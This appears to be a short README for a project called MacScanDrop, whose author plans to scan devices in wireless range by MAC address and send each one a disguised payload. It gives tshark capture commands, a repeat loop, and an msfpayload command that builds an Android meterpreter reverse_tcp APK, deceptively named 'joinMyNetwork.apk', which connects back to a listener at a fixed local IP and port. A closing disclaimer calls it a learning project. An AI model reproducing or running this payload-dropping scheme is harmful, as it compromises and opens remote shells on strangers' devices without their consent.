# MacScanDrop

Idea
The idea here is to scan for devices in range of my own network. Sending out a request to all devices in range to join. In return I want to provide them with a reverse_tcp payload.

The one unique identifier would be MAC (media access control) address. Which we will SCAN for, and DROP a payload. Lets see how this pans out.

Problem
The currently known problems associated with this idea are;
    -Having a script running for a period of time
        This could be in a while loop for say 300 seconds
    -To prevent the req beign sent out again to the same device, save the MAC it into a file or db
        .txt file or a sql db, looking for the most efficient
    -heterogeneity issues
        If it is an android device wanting to connect, would have to wrap the payload into a .apk
    -Which CLI tools to use to scan the LAN
        wireshark, tshark, arp-scan, airmon-ng & airodump-ng


Current solution, more like ideas
while true ; do ./MacScanDrop.<extension> ; sleep 300 ; done

tshark -D (Print a list of the interfaces on which TShark can capture)
    wlan0 is on interface 2
tshark -i 2 -a [autostop] duration:300 -w [write] tshark-scan-collection.pcap

msfpayload android/meterpreter/reverse_tcp LHOST=192.168.1.120 LPORT=4444 R > joinMyNetwork.apk


# This project is for learning and knowledge share to which I do no advocate or take upon any responsibility for illegal actions and/or damage performed or caused by individuals who use this information for purposes which it is not intended to be used.
